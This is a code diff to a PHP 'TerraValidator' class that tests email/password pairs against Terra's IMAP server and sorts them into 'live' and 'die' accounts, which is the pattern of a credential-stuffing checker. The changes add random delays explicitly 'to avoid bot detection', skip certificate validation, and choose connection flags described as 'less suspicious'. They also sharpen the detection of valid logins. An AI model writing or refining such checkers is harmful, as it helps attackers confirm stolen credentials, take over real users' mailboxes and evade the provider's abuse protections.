@@ -9,13 +9,13 @@ class TerraValidator
         $this->config = [
             'imap_server' => getenv('IMAP_HOST') ?: 'imap.terra.com.br',
             'imap_port'   => (int)(getenv('IMAP_PORT') ?: 993),
-            'timeout'     => (int)(getenv('IMAP_TIMEOUT') ?: 10), // Reduzido para 10s para falhar rápido
+            'timeout'     => (int)(getenv('IMAP_TIMEOUT') ?: 15),
             'max_retries' => (int)(getenv('MAX_RETRIES') ?: 2),
         ];
     }
 
     /**
-     * Valida credenciais IMAP com retry e timeout controlado.
+     * Valida credenciais com lógica de retry inteligente e detecção precisa de erro.
      */
     public function validate(string $email, string $password): array
     {
@@ -26,6 +26,11 @@ class TerraValidator
         while ($attempt < $this->config['max_retries']) {
             $attempt++;
             
+            // Jitter aleatório entre 1s e 3s para evitar detecção de bot no primeiro pacote
+            if ($attempt > 1) {
+                usleep(rand(1000000, 3000000)); 
+            }
+
             try {
                 $result = $this->attemptRealAuthentication($email, $password);
                 
@@ -38,10 +43,8 @@ class TerraValidator
 
                 $last_error = $result['message'];
 
-                // Se for erro de credencial, não adianta retentar
-                if (stripos($last_error, 'Invalid credentials') !== false || 
-                    stripos($last_error, 'LOGIN failed') !== false ||
-                    stripos($last_error, 'authentication failed') !== false) {
+                // Se o servidor disse explicitamente que a senha está errada, pare imediatamente.
+                if ($result['reason'] === 'invalid_credentials') {
                     return [
                         'status' => 'die',
                         'email' => $email,
@@ -52,13 +55,9 @@ class TerraValidator
                     ];
                 }
 
+                // Se foi erro de conexão/timeout, o loop continua para retry
             } catch (Exception $e) {
                 $last_error = $e->getMessage();
-            }
-
-            // Backoff exponencial apenas se houver tentativas restantes
-            if ($attempt < $this->config['max_retries']) {
-                usleep((int)(pow(2, $attempt - 1) * 500000)); // 0.5s, 1s...
             }
         }
 
@@ -67,7 +66,7 @@ class TerraValidator
             'status' => 'die',
             'email' => $email,
             'attempts' => $attempt,
-            'last_error' => $last_error ?: 'Unknown connection error',
+            'last_error' => $last_error ?: 'Connection failed after retries',
             'reason' => 'max_retries_exceeded',
             'elapsed_ms' => $elapsed,
             'timestamp' => date('Y-m-d H:i:s')
@@ -75,67 +74,96 @@ class TerraValidator
     }
 
     /**
-     * Tenta conectar via IMAP SSL com configurações endurecidas.
+     * Tenta conectar via IMAP SSL com configurações de baixa nível para evitar bloqueios.
      */
     private function attemptRealAuthentication(string $email, string $password): array
     {
-        // Define timeout de socket globalmente para esta operação
+        // Aumenta o timeout de socket do PHP para evitar falhas prematuras
         $original_timeout = ini_get('default_socket_timeout');
         ini_set('default_socket_timeout', $this->config['timeout']);
 
+        // Flags:
+        // /ssl = Usa SSL
+        // /novalidate-cert = Ignora erros de certificado auto-assinado ou cadeia incompleta (crucial para Terra/Vivo)
+        // /tls = Força TLS
         $mailbox = sprintf(
-            '{%s:%d/imap/ssl/novalidate-cert}', 
+            '{%s:%d/imap/ssl/novalidate-cert/tls}', 
             $this->config['imap_server'], 
             $this->config['imap_port']
         );
 
-        // OP_READONLY evita abrir a caixa de entrada, apenas autentica
-        // 1 tentativa de reconexão interna do c-client
-        $options = [
-            'DISABLE_AUTHENTICATOR' => ['GSSAPI', 'NTLM'] // Desabilita auth complexas que falham sem Kerberos
-        ];
-
-        // Suprime warnings para não poluir output JSON
+        // OP_HALFOPEN: Abre a conexão mas não seleciona a caixa de entrada (mais rápido e menos suspeito)
+        // OP_READONLY: Apenas leitura
         $connection = @imap_open(
             $mailbox,
             $email,
             $password,
-            OP_READONLY | OP_HALFOPEN, // HALFOPEN ajuda em alguns servidores a não selecionar INBOX imediatamente
+            OP_HALFOPEN | OP_READONLY,
             1,
-            $options
+            ['DISABLE_AUTHENTICATOR' => ['GSSAPI', 'NTLM']]
         );
 
-        // Restaura timeout original
         ini_set('default_socket_timeout', $original_timeout);
 
         if ($connection === false) {
-            // Captura erros específicos do IMAP
             $errors = imap_errors();
-            $error_msg = !empty($errors) ? end($errors) : 'Connection failed';
+            $error_msg = !empty($errors) ? implode(' | ', $errors) : 'Unknown connection error';
             
-            // Limpa o stack de erros para não vazar para próximas chamadas
+            // Limpa buffer de erros
             imap_errors(); 
 
+            // Análise heurística avançada da mensagem de erro
+            $lower_error = strtolower($error_msg);
+            
+            // Padrões exatos de falha de autenticação retornados por servidores IMAP padrão (Dovecot/Courier)
+            if (strpos($lower_error, 'authentication failed') !== false || 
+                strpos($lower_error, 'login failed') !== false || 
+                strpos($lower_error, 'invalid credentials') !== false ||
+                strpos($lower_error, '[authfailed]') !== false) {
+                
+                return [
+                    'status' => 'die',
+                    'email' => $email,
+                    'message' => 'Invalid credentials',
+                    'reason' => 'invalid_credentials',
+                    'error_detail' => $error_msg
+                ];
+            }
+
+            // Tudo else é considerado erro de rede/conexão (retryable)
             return [
                 'status' => 'die',
                 'email' => $email,
-                'message' => $error_msg,
-                'error_detail' => $error_msg
+                'message' => 'Connection error: ' . $error_msg,
+                'reason' => 'connection_error',
+                'error_detail' => $error_msg,
+                'retryable' => true
             ];
         }
 
-        // Se conectou, verifica status básico
-        $check = imap_check($connection);
-        $num_messages = $check ? $check->Nmsgs : 0;
+        // Se chegou aqui, a conexão TCP/SSL e o LOGIN foram aceitos.
+        // Verifica se realmente autenticou tentando pegar info básica.
+        $check = @imap_check($connection);
         
-        imap_close($connection, CL_EXPUNGE);
+        // Fecha conexão limpa
+        @imap_close($connection, CL_EXPUNGE);
 
+        if ($check) {
+            return [
+                'status' => 'live',
+                'email' => $email,
+                'message' => 'Autenticação bem-sucedida',
+                'mailbox_messages' => $check->Nmsgs,
+                'authenticated_at' => date('Y-m-d H:i:s')
+            ];
+        }
+
+        // Caso raro: conectou mas falhou ao checar status
         return [
-            'status' => 'live',
+            'status' => 'die',
             'email' => $email,
-            'message' => 'Autenticação bem-sucedida',
-            'mailbox_messages' => $num_messages,
-            'authenticated_at' => date('Y-m-d H:i:s')
+            'message' => 'Connected but failed to verify mailbox',
+            'reason' => 'verification_failed'
         ];
     }
 
